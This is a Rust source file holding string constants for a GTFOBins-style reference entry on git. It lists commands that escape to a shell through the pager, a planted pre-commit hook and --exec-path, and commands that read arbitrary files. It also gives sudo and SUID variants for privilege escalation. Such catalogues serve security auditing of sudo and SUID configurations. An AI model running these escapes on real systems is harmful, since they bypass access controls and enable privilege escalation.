pub static BIN_NAME: &'static str = "git";
pub static SH_CODE_1: &'static str = r#"
    
    PAGER='sh -c "exec sh 0<&1"' git -p help
"#;
pub static SH_DESC_2: &'static str =
    "This invokes the default pager, which is likely to be `less`, other functions may apply.";
pub static SH_CODE_2: &'static str = r#"
    
    git help config
    !/bin/sh
"#;
pub static SH_DESC_3: &'static str = "The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be `less`, other functions may apply.";
pub static SH_CODE_3: &'static str = r#"
    
    git branch --help config
    !/bin/sh
"#;
pub static SH_DESC_4: &'static str = "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.";
pub static SH_CODE_4: &'static str = r#"
    
    TF=$(mktemp -d)
    git init "$TF"
    echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
    mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
    git -C "$TF" commit --allow-empty -m x
"#;
pub static SH_CODE_5: &'static str = r#"
    
    TF=$(mktemp -d)
    ln -s /bin/sh "$TF/git-x"
    git "--exec-path=$TF" x
"#;
pub static FR_DESC: &'static str =
    "The read file content is displayed in `diff` style output format.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    git diff /dev/null $LFILE
"#;
pub static SUDO_CODE_1: &'static str = r#"
    
    sudo PAGER='sh -c "exec sh 0<&1"' git -p help
"#;
pub static SUDO_DESC_2: &'static str =
    "This invokes the default pager, which is likely to be `less`, other functions may apply.";
pub static SUDO_CODE_2: &'static str = r#"
    
    sudo git -p help config
    !/bin/sh
"#;
pub static SUDO_DESC_3: &'static str = "The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be `less`, other functions may apply.";
pub static SUDO_CODE_3: &'static str = r#"
    sudo git branch --help config
    !/bin/sh
"#;
pub static SUDO_DESC_4: &'static str = "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.";
pub static SUDO_CODE_4: &'static str = r#"
    
    TF=$(mktemp -d)
    git init "$TF"
    echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
    mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
    sudo git -C "$TF" commit --allow-empty -m x
"#;
pub static SUDO_CODE_5: &'static str = r#"
    
    TF=$(mktemp -d)
    ln -s /bin/sh "$TF/git-x"
    sudo git "--exec-path=$TF" x
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which git) .

    PAGER='sh -c "exec sh 0<&1"' ./git -p help
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SH_3: Code<'static> = Code {
    title: "SH_CODE_3",
    code: SH_CODE_3,
    tag: Tag::SH,
};
pub static SH_4: Code<'static> = Code {
    title: "SH_CODE_4",
    code: SH_CODE_4,
    tag: Tag::SH,
};
pub static SH_5: Code<'static> = Code {
    title: "SH_CODE_5",
    code: SH_CODE_5,
    tag: Tag::SH,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
pub static SUDO_3: Code<'static> = Code {
    title: "SUDO_CODE_3",
    code: SUDO_CODE_3,
    tag: Tag::SUDO,
};
pub static SUDO_4: Code<'static> = Code {
    title: "SUDO_CODE_4",
    code: SUDO_CODE_4,
    tag: Tag::SUDO,
};
pub static SUDO_5: Code<'static> = Code {
    title: "SUDO_CODE_5",
    code: SUDO_CODE_5,
    tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
